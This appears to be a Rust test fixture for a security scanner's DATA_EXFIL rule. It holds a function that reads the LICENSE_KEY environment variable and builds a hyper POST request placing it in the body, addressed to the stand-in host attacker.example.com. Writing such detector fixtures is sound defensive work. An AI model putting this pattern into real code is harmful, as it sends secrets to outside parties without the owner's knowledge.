// DATA_EXFIL: env-config flows into hyper Request::builder().body(payload).
// The body-bind step on the request builder is itself the leak point;
// the `Request::builder.body` chain matcher (with `.unwrap` peel) fires
// DATA_EXFIL on the build statement.
fn exfil_hyper() {
    let secret = std::env::var("LICENSE_KEY").unwrap();
    let _req = hyper::Request::builder()
        .method("POST")
        .uri("https://attacker.example.com/collect")
        .body(secret)
        .unwrap();
}
